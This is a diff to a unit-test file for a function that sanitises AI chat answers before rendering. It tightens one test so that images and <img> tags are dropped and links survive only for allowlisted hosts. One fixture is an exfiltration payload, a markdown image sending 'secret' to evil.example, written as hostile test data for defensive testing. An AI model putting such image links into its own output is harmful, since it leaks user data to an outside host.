@@ -186,12 +186,14 @@ describe('cleanChatAnswer', () => {
       cleanChatAnswer('```\nx <!-- lumo-security:chat-answer --> y\n```')
     ).not.toContain('lumo-security')
   })
-  it('drops images and media tags outside code (nothing fetched on render), keeps links', () => {
+  it('no image or tag renders outside code; links only to allowlisted hosts', () => {
     const out = cleanChatAnswer(
-      'See ![x](https://evil.example/?d=secret) and <img src="https://evil.example/a"> or [docs](https://example.com).\n```\n![keep](in-code)\n```'
+      'See ![x](https://evil.example/?d=secret) and <img src="https://evil.example/a"> or [docs](https://example.com) and [gh](https://github.com/o/r).\n```\n![keep](in-code)\n```'
     )!
-    expect(out).not.toContain('evil.example')
-    expect(out).toContain('[docs](https://example.com)')
+    expect(out).not.toMatch(/!\[x\]\(/)
+    expect(out).not.toContain('<img')
+    expect(out).toContain('[docs]&#40;https://example.com)')
+    expect(out).toContain('[gh](https://github.com/o/r)')
     expect(out).toContain('![keep](in-code)')
   })
   it('keeps generics and other angle brackets in code and prose', () => {
@@ -218,7 +220,7 @@ describe('cleanChatAnswer', () => {
   it('caps the length; empty is null', () => {
     const capped = cleanChatAnswer('x'.repeat(10_000))!
     expect(capped.length).toBeLessThanOrEqual(CHAT_ANSWER_MAX_CHARS)
-    expect(capped.length).toBeGreaterThan(CHAT_ANSWER_MAX_CHARS - 10)
+    expect(capped.length).toBeGreaterThan(CHAT_ANSWER_MAX_CHARS - 20)
     expect(capped.endsWith('…')).toBe(true)
     expect(cleanChatAnswer('  <!-- x -->  ')).toBeNull()
   })
